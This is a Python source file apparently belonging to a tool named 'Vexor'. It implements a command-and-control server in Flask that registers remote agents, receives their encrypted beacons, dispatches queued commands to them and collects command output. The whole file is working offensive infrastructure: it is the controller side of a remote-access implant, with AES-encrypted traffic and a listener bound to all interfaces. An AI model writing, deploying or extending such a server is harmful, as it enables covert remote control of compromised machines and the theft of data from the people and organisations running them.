"""Vexor C2 Server — manages agent connections and task dispatch."""

import os
import sys
import json
import time
import hashlib
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import AES_KEY, C2_PORT
from vexor import crypto


class C2Server:
    def __init__(self, port: int = C2_PORT, key: bytes = AES_KEY):
        self.port = port
        self.key = key
        self.agents = {}
        self.task_queue = {}
        self.results = {}

    def start(self):
        from flask import Flask, request, Response

        app = Flask(__name__)

        @app.route("/register", methods=["POST"])
        def register():
            try:
                data = json.loads(crypto.decrypt(request.data, self.key))
                agent_id = data["id"]
                self.agents[agent_id] = {
                    "info": data,
                    "last_seen": time.time(),
                    "tasks": [],
                }
                print(f"[+] Agent registered: {agent_id} ({data['hostname']})")
                return self._encrypt_response({"status": "success"})
            except Exception as e:
                return self._encrypt_response({"status": "error", "message": str(e)}), 400

        @app.route("/beacon", methods=["POST"])
        def beacon():
            try:
                data = json.loads(crypto.decrypt(request.data, self.key))
                agent_id = data["id"]
                if agent_id in self.agents:
                    self.agents[agent_id]["last_seen"] = time.time()

                # Check for pending tasks
                task = self.task_queue.pop(agent_id, None)
                if task:
                    print(f"[*] Dispatching task to {agent_id}: {task['command']}")
                    return self._encrypt_response({"status": "success", "task": task})

                return self._encrypt_response({"status": "success"})
            except Exception as e:
                return self._encrypt_response({"status": "error", "message": str(e)}), 400

        @app.route("/result", methods=["POST"])
        def result():
            try:
                data = json.loads(crypto.decrypt(request.data, self.key))
                agent_id = data["id"]
                task_id = data["task"]
                output = data["output"]

                self.results.setdefault(agent_id, []).append({
                    "task_id": task_id,
                    "output": output,
                    "time": time.time(),
                })
                print(f"[+] Result from {agent_id} (task {task_id}):\n{output[:500]}")
                return self._encrypt_response({"status": "success"})
            except Exception as e:
                return self._encrypt_response({"status": "error", "message": str(e)}), 400

        print(f"[*] Vexor C2 listening on port {self.port}")
        app.run(host="0.0.0.0", port=self.port, ssl_context="adhoc")

    def _encrypt_response(self, data: dict):
        body = crypto.encrypt(json.dumps(data).encode(), self.key)
        return Response(body, content_type="application/octet-stream")


def main():
    server = C2Server()
    server.start()


if __name__ == "__main__":
    main()
